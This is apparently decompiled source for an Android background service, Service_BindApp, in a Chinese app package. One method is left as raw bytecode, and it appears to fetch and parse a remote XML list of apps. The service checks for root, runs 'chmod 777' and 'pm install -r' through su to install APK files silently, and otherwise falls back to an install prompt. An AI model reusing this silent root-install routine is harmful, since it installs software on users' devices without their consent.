package com.yongrun.app.sxmn.service;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;

public class Service_BindApp
  extends Service
{
  private String[] a;
  private String b;
  private String[] c;
  
  public Service_BindApp() {}
  
  public void a(File paramFile)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
    localIntent.setFlags(268435456);
    startActivity(localIntent);
  }
  
  public boolean a()
  {
    try
    {
      if (!new File("/system/bin/su").exists())
      {
        boolean bool = new File("/system/xbin/su").exists();
        if (!bool) {
          return false;
        }
      }
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public boolean a(File paramFile, boolean paramBoolean)
  {
    paramBoolean = true;
    System.out.println(paramFile.getPath());
    System.out.println(paramFile.getPath() + "==");
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      OutputStream localOutputStream = localProcess.getOutputStream();
      DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
      localDataOutputStream.writeBytes("chmod 777 " + paramFile.getPath() + "\n");
      localDataOutputStream.writeBytes("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install -r " + paramFile.getPath());
      localDataOutputStream.flush();
      localDataOutputStream.close();
      localOutputStream.close();
      int i = localProcess.waitFor();
      if (i == 0) {}
      for (;;)
      {
        if (!paramBoolean) {
          a(paramFile);
        }
        return paramBoolean;
        if (i == 1) {
          paramBoolean = false;
        } else {
          paramBoolean = false;
        }
      }
      return false;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      a(paramFile);
    }
  }
  
  public boolean a(String paramString)
  {
    List localList = getPackageManager().getInstalledPackages(0);
    ArrayList localArrayList = new ArrayList();
    int i;
    if (localList != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localList.size()) {
        return localArrayList.contains(paramString);
      }
      localArrayList.add(((PackageInfo)localList.get(i)).packageName);
      i += 1;
    }
  }
  
  /* Error */
  public List<com.yongrun.app.sxmn.c.a> b()
  {
    // Byte code:
    //   0: new 183	com/yongrun/app/sxmn/a
    //   3: dup
    //   4: invokespecial 184	com/yongrun/app/sxmn/a:<init>	()V
    //   7: astore_2
    //   8: new 158	java/util/ArrayList
    //   11: dup
    //   12: invokespecial 159	java/util/ArrayList:<init>	()V
    //   15: astore_3
    //   16: aload_0
    //   17: ldc -70
    //   19: iconst_0
    //   20: invokevirtual 190	com/yongrun/app/sxmn/service/Service_BindApp:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   23: astore 4
    //   25: aload 4
    //   27: ldc -64
    //   29: ldc -62
    //   31: invokeinterface 200 3 0
    //   36: astore 5
    //   38: invokestatic 205	com/yongrun/app/sxmn/common/b:a	()Lcom/yongrun/app/sxmn/common/b;
    //   41: new 79	java/lang/StringBuilder
    //   44: dup
    //   45: ldc -49
    //   47: invokespecial 86	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   50: aload 5
    //   52: invokevirtual 92	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   55: invokevirtual 95	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   58: invokevirtual 210	com/yongrun/app/sxmn/common/b:a	(Ljava/lang/String;)Ljava/lang/String;
    //   61: astore 5
    //   63: aload 5
    //   65: ifnull +288 -> 353
    //   68: new 212	org/xml/sax/InputSource
    //   71: dup
    //   72: new 214	java/io/StringReader
    //   75: dup
    //   76: aload 5
    //   78: invokespecial 215	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   81: invokespecial 218	org/xml/sax/InputSource:<init>	(Ljava/io/Reader;)V
    //   84: pop
    //   85: invokestatic 224	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   88: invokevirtual 228	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   91: new 230	java/io/ByteArrayInputStream
    //   94: dup
    //   95: aload 5
    //   97: invokevirtual 234	java/lang/String:getBytes	()[B
    //   100: invokespecial 237	java/io/ByteArrayInputStream:<init>	([B)V
    //   103: invokevirtual 243	javax/xml/parsers/DocumentBuilder:parse	(Ljava/io/InputStream;)Lorg/w3c/dom/Document;
    //   106: astore 5
    //   108: aload 5
    //   110: ldc -11
    //   112: invokeinterface 251 2 0
    //   117: astore 6
    //   119: iconst_0
    //   120: istore_1
    //   121: iload_1
    //   122: aload 6
    //   124: invokeinterface 256 1 0
    //   129: if_icmplt +230 -> 359
    //   132: aload 5
    //   134: ldc_w 258
    //   137: invokeinterface 251 2 0
    //   142: astore 6
    //   144: aload 6
    //   146: ifnull +207 -> 353
    //   149: aload 6
    //   151: invokeinterface 256 1 0
    //   156: ifle +197 -> 353
    //   159: aload 6
    //   161: iconst_0
    //   162: invokeinterface 262 2 0
    //   167: checkcast 264	org/w3c/dom/Element
    //   170: ldc_w 266
    //   173: invokeinterface 267 2 0
    //   178: iconst_0
    //   179: invokeinterface 262 2 0
    //   184: invokeinterface 273 1 0
    //   189: invokeinterface 276 1 0
    //   194: astore 5
    //   196: aload_0
    //   197: aload 6
    //   199: iconst_0
    //   200: invokeinterface 262 2 0
    //   205: checkcast 264	org/w3c/dom/Element
    //   208: ldc_w 278
    //   211: invokeinterface 267 2 0
    //   216: iconst_0
    //   217: invokeinterface 262 2 0
    //   222: invokeinterface 273 1 0
    //   227: invokeinterface 276 1 0
    //   232: putfield 280	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   235: aload 6
    //   237: iconst_0
    //   238: invokeinterface 262 2 0
    //   243: checkcast 264	org/w3c/dom/Element
    //   246: ldc -64
    //   248: invokeinterface 267 2 0
    //   253: iconst_0
    //   254: invokeinterface 262 2 0
    //   259: invokeinterface 273 1 0
    //   264: invokeinterface 276 1 0
    //   269: astore 6
    //   271: aload_0
    //   272: aload 5
    //   274: ldc_w 282
    //   277: invokevirtual 286	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   280: putfield 19	com/yongrun/app/sxmn/service/Service_BindApp:a	[Ljava/lang/String;
    //   283: aload_0
    //   284: aload 6
    //   286: ldc_w 282
    //   289: invokevirtual 286	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   292: putfield 17	com/yongrun/app/sxmn/service/Service_BindApp:c	[Ljava/lang/String;
    //   295: aload 4
    //   297: invokeinterface 290 1 0
    //   302: astore 4
    //   304: aload 4
    //   306: ldc_w 292
    //   309: aload 5
    //   311: invokeinterface 298 3 0
    //   316: pop
    //   317: aload 4
    //   319: ldc_w 300
    //   322: aload_0
    //   323: getfield 280	com/yongrun/app/sxmn/service/Service_BindApp:b	Ljava/lang/String;
    //   326: invokeinterface 298 3 0
    //   331: pop
    //   332: aload 4
    //   334: ldc_w 302
    //   337: aload 6
    //   339: invokeinterface 298 3 0
    //   344: pop
    //   345: aload 4
    //   347: invokeinterface 305 1 0
    //   352: pop
    //   353: aload_2
    //   354: invokevirtual 307	com/yongrun/app/sxmn/a:a	()V
    //   357: aload_3
    //   358: areturn
    //   359: aload 6
    //   361: iload_1
    //   362: invokeinterface 262 2 0
    //   367: checkcast 264	org/w3c/dom/Element
    //   370: ldc_w 309
    //   373: invokeinterface 267 2 0
    //   378: iconst_0
    //   379: invokeinterface 262 2 0
    //   384: invokeinterface 273 1 0
    //   389: invokeinterface 276 1 0
    //   394: astore 7
    //   396: aload 6
    //   398: iload_1
    //   399: invokeinterface 262 2 0
    //   404: checkcast 264	org/w3c/dom/Element
    //   407: ldc_w 311
    //   410: invokeinterface 267 2 0
    //   415: iconst_0
    //   416: invokeinterface 262 2 0
    //   421: invokeinterface 273 1 0
    //   426: invokeinterface 276 1 0
    //   431: astore 8
    //   433: aload 6
    //   435: iload_1
    //   436: invokeinterface 262 2 0
    //   441: checkcast 264	org/w3c/dom/Element
    //   444: ldc_w 313
    //   447: invokeinterface 267 2 0
    //   452: iconst_0
    //   453: invokeinterface 262 2 0
    //   458: invokeinterface 273 1 0
    //   463: invokeinterface 276 1 0
    //   468: astore 9
    //   470: aload 6
    //   472: iload_1
    //   473: invokeinterface 262 2 0
    //   478: checkcast 264	org/w3c/dom/Element
    //   481: ldc_w 315
    //   484: invokeinterface 267 2 0
    //   489: iconst_0
    //   490: invokeinterface 262 2 0
    //   495: invokeinterface 273 1 0
    //   500: invokeinterface 276 1 0
    //   505: astore 10
    //   507: aload 6
    //   509: iload_1
    //   510: invokeinterface 262 2 0
    //   515: checkcast 264	org/w3c/dom/Element
    //   518: ldc_w 317
    //   521: invokeinterface 267 2 0
    //   526: iconst_0
    //   527: invokeinterface 262 2 0
    //   532: invokeinterface 273 1 0
    //   537: invokeinterface 276 1 0
    //   542: astore 11
    //   544: new 319	com/yongrun/app/sxmn/c/a
    //   547: dup
    //   548: invokespecial 320	com/yongrun/app/sxmn/c/a:<init>	()V
    //   551: astore 12
    //   553: aload 12
    //   555: aload 8
    //   557: invokevirtual 323	com/yongrun/app/sxmn/c/a:d	(Ljava/lang/String;)V
    //   560: aload 12
    //   562: aload 7
    //   564: invokevirtual 325	com/yongrun/app/sxmn/c/a:a	(Ljava/lang/String;)V
    //   567: aload 12
    //   569: aload 9
    //   571: invokevirtual 327	com/yongrun/app/sxmn/c/a:c	(Ljava/lang/String;)V
    //   574: aload 12
    //   576: aload 11
    //   578: invokevirtual 329	com/yongrun/app/sxmn/c/a:b	(Ljava/lang/String;)V
    //   581: aload 12
    //   583: aload 10
    //   585: invokevirtual 332	com/yongrun/app/sxmn/c/a:e	(Ljava/lang/String;)V
    //   588: aload_3
    //   589: aload 12
    //   591: invokeinterface 180 2 0
    //   596: pop
    //   597: iload_1
    //   598: iconst_1
    //   599: iadd
    //   600: istore_1
    //   601: goto -480 -> 121
    //   604: astore_3
    //   605: new 158	java/util/ArrayList
    //   608: dup
    //   609: invokespecial 159	java/util/ArrayList:<init>	()V
    //   612: astore 4
    //   614: aload_3
    //   615: invokevirtual 145	java/lang/Exception:printStackTrace	()V
    //   618: aload_2
    //   619: invokevirtual 307	com/yongrun/app/sxmn/a:a	()V
    //   622: aload 4
    //   624: areturn
    //   625: astore_3
    //   626: aload_2
    //   627: invokevirtual 307	com/yongrun/app/sxmn/a:a	()V
    //   630: aload_3
    //   631: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	632	0	this	Service_BindApp
    //   120	481	1	i	int
    //   7	620	2	localA	com.yongrun.app.sxmn.a
    //   15	574	3	localArrayList	ArrayList
    //   604	11	3	localException	Exception
    //   625	6	3	localObject1	Object
    //   23	600	4	localObject2	Object
    //   36	274	5	localObject3	Object
    //   117	391	6	localObject4	Object
    //   394	169	7	str1	String
    //   431	125	8	str2	String
    //   468	102	9	str3	String
    //   505	79	10	str4	String
    //   542	35	11	str5	String
    //   551	39	12	localA1	com.yongrun.app.sxmn.c.a
    // Exception table:
    //   from	to	target	type
    //   16	63	604	java/lang/Exception
    //   68	119	604	java/lang/Exception
    //   121	144	604	java/lang/Exception
    //   149	353	604	java/lang/Exception
    //   359	597	604	java/lang/Exception
    //   16	63	625	finally
    //   68	119	625	finally
    //   121	144	625	finally
    //   149	353	625	finally
    //   359	597	625	finally
    //   605	618	625	finally
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    new Thread(new a(this, com.yongrun.app.sxmn.common.a.a())).start();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
